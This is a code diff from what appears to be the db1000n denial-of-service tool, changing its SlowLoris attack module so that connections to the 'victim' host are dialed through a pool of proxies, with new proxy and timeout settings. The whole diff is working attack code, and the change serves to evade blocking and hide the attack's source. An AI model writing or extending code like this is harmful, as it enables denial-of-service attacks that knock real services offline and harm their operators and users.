@@ -13,6 +13,7 @@ import (
 	utls "github.com/refraction-networking/utls"
 	"go.uber.org/zap"
 
+	"github.com/Arriven/db1000n/src/utils"
 	"github.com/Arriven/db1000n/src/utils/metrics"
 )
 
@@ -26,6 +27,8 @@ type Config struct {
 	Path             string        // Target Path. Http POST must be allowed for this Path
 	HostHeader       string        // Host header value in case it is different than the hostname in Path
 	ClientID         string
+	ProxyURLs        string
+	Timeout          time.Duration
 }
 
 // SlowLoris is a main logic struct for the package
@@ -95,7 +98,7 @@ func (s SlowLoris) dialWorker(stopChan chan bool, logger *zap.Logger, config *Co
 		default:
 			time.Sleep(config.RampUpInterval)
 
-			if conn := s.dialVictim(logger, targetHostPort, isTLS); conn != nil {
+			if conn := s.dialVictim(logger, config, targetHostPort, isTLS); conn != nil {
 				go s.doLoris(logger, config, targetHostPort, conn, activeConnectionsCh, requestHeader)
 			}
 		}
@@ -110,9 +113,8 @@ func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
 	}
 }
 
-func (s SlowLoris) dialVictim(logger *zap.Logger, hostPort string, isTLS bool) io.ReadWriteCloser {
-	// TODO: add support for dialing the Path via a random proxy from the given pool.
-	conn, err := net.Dial("tcp", hostPort)
+func (s SlowLoris) dialVictim(logger *zap.Logger, config *Config, hostPort string, isTLS bool) io.ReadWriteCloser {
+	conn, err := utils.GetProxyFunc(config.ProxyURLs, config.Timeout)("tcp", hostPort)
 	if err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
 		logger.Debug("couldn't establish connection", zap.String("addr", hostPort), zap.Error(err))
